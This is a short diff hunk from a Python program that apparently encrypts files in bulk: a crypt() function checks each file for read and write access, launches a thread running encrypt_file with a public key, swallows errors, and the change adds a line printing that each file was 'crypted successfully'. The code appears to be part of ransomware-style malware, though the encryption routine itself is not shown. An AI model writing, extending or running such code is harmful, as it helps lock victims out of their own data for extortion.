@@ -92,6 +92,7 @@ def crypt():
                     if os.access(file, os.W_OK) and os.access(file, os.R_OK):
                         try:
                             Thread(target=encrypt_file, args=(file, pubkey)).start()
+                            print(file, " : crypted successfully ")
                         except:
                             print("ignoring error on crypting this file : ", file)
                     else:
